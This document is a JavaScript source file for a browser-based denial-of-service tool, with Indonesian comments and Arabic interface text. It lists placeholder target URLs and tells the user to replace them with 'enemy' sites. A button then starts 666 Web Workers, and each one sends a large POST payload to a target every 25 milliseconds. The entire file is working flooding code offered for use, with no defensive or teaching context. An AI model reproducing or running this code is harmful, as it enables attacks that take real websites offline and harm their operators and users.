// 🔥 DDoS Targets (Ganti dengan target musuh!)
const TARGETS = [
    "https://TARGET-1.com",
    "https://TARGET-2.net",
    "https://TARGET-3.org"
];

let attackWorkers = [];
let isDestroying = false;

function createWarrior(target) {
    return new Worker(URL.createObjectURL(new Blob([`
        let attackCount = 0;
        const BOMB_PAYLOAD = new Array(100000).fill(0);
        
        function fireMissile() {
            fetch("${target}", {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: BOMB_PAYLOAD })
            })
            .then(() => {
                attackCount++;
                postMessage(\`☠️ هجمة #\${attackCount} → \${target}\`);
            })
            .catch(() => postMessage('🔥 الخادم يحترق!'));
        }

        setInterval(fireMissile, 25);
    `])));
}

document.getElementById('attack-btn').addEventListener('click', function() {
    isDestroying = !isDestroying;
    
    if(isDestroying) {
        this.textContent = "☠️ تدمير نشط";
        this.style.background = "#000";
        this.style.color = "#ff0000";

        // Aktifkan 666 zombie workers
        for(let i = 0; i < 666; i++) {
            const target = TARGETS[i % TARGETS.length];
            const worker = createWarrior(target);
            
            worker.onmessage = function(e) {
                document.getElementById('status').innerHTML = 
                    `[الهجمة \${i}] \${e.data}<br>` + 
                    document.getElementById('status').innerHTML;
            };
            
            attackWorkers.push(worker);
        }
    } else {
        // Matikan semua workers
        attackWorkers.forEach(w => w.terminate());
        attackWorkers = [];
        this.textContent = "🔥 بدء الهجوم";
        this.style.background = "#ff0000";
        this.style.color = "#000";
        document.getElementById('status').innerHTML = "الحالة: توقف القصف";
    }
});